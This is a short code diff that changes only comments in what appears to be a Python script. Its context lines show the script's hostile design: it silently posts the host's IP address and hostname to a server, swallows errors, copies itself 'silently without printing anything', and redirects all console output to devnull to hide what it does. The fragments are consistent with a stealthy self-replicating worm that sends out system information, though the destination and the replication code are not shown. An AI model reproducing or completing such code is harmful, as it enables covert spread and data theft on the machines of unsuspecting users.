@@ -26,7 +26,7 @@ def send_data_to_server(ip_address, hostname):
         response = requests.post(url, json=data)
         # Check if the request was successful
         if response.status_code == 200:
-            pass  # Data sent successfully (no need to print anything)
+            pass  # Data sent successfully, no need to print anything
         else:
             pass  # Handle error silently
     except requests.RequestException as e:
@@ -44,7 +44,7 @@ def replicate_script():
         # Replication happens silently without printing anything
 
 def suppress_output():
-    # Suppress console output (redirect stdout and stderr to devnull)
+    # Suppress console output (redirect stdout and stderr to /dev/null)
     sys.stdout = open(os.devnull, 'w')
     sys.stderr = open(os.devnull, 'w')
 
